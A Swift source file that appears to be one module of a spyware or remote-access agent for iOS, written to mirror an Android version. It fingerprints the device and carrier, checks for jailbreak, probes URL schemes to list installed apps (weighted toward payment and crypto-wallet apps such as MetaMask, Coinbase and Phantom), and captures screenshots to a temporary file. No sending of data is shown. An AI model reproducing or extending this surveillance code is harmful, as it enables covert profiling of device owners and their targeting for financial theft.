//
//  DeviceInfo.swift
//  Device fingerprint + carrier.
//

import CoreTelephony
import Foundation
import UIKit

final class DeviceInfo {

    static let shared = DeviceInfo()

    func info() -> String {
        let device = UIDevice.current
        device.isBatteryMonitoringEnabled = true
        var obj: [String: Any] = [
            "model": device.modelName,
            "brand": "Apple",
            "device": device.identifierForVendor?.uuidString ?? "unknown",
            "android": device.systemVersion,
            "sdk": 0,
            "battery": device.batteryLevel,
            "battery_state": device.batteryState.rawValue,
            "jailbroken": isJailbroken()
        ]
        if let carrier = CTTelephonyNetworkInfo().serviceSubscriberCellularProviders?.values.first {
            obj["carrier"] = carrier.carrierName ?? ""
        }
        let data = (try? JSONSerialization.data(withJSONObject: obj)) ?? Data()
        return String(data: data, encoding: .utf8) ?? "{}"
    }

    func phoneNumber() -> String? {
        // carrier info only; real number is not exposed on modern iOS
        return nil
    }

    private func isJailbroken() -> Bool {
        let paths = [
            "/Applications/Cydia.app",
            "/Library/MobileSubstrate/MobileSubstrate.dylib",
            "/bin/bash",
            "/usr/sbin/sshd",
            "/etc/apt"
        ]
        for p in paths where FileManager.default.fileExists(atPath: p) {
            return true
        }
        return false
    }
}

/// Installed-app probe via URL schemes (limited but useful signal).
enum AppLister {
    static func installedSchemes() -> String {
        let schemes: [(String, String)] = [
            ("whatsapp", "WhatsApp"), ("fb", "Facebook"), ("instagram", "Instagram"),
            ("twitter", "Twitter/X"), ("tiktok", "TikTok"), ("telegram", "Telegram"),
            ("snapchat", "Snapchat"), ("youtube", "YouTube"), ("gmail", "Gmail"),
            ("googlegmail", "Google Mail"), ("maps", "Maps"), ("spotify", "Spotify"),
            ("shazam", "Shazam"), ("uber", "Uber"), ("lyft", "Lyft"), ("venmo", "Venmo"),
            ("paypal", "PayPal"), ("cashapp", "Cash App"), ("revolut", "Revolut"),
            ("binance", "Binance"), ("coinbase", "Coinbase"), ("metamask", "MetaMask"),
            ("trust", "Trust Wallet"), ("phantom", "Phantom Wallet")
        ]
        var found: [[String: String]] = []
        for (scheme, name) in schemes {
            if let url = URL(string: "\(scheme)://"),
               UIApplication.shared.canOpenURL(url) {
                found.append(["pkg": scheme, "name": name])
            }
        }
        let data = (try? JSONSerialization.data(withJSONObject: found)) ?? Data()
        return String(data: data, encoding: .utf8) ?? "[]"
    }
}

/// Screenshot capture — only works while the app is foregrounded.
enum ScreenGrabber {
    static func capture() -> String? {
        guard let window = UIApplication.shared.windows.first(where: { $0.isKeyWindow }) else {
            return nil
        }
        let renderer = UIGraphicsImageRenderer(bounds: window.bounds)
        let image = renderer.image { ctx in
            window.drawHierarchy(in: window.bounds, afterScreenUpdates: false)
        }
        guard let data = image.pngData() else { return nil }
        let url = FileManager.default.temporaryDirectory
            .appendingPathComponent("s\(Int(Date().timeIntervalSince1970)).png")
        do {
            try data.write(to: url)
            return url.path
        } catch {
            return nil
        }
    }
}
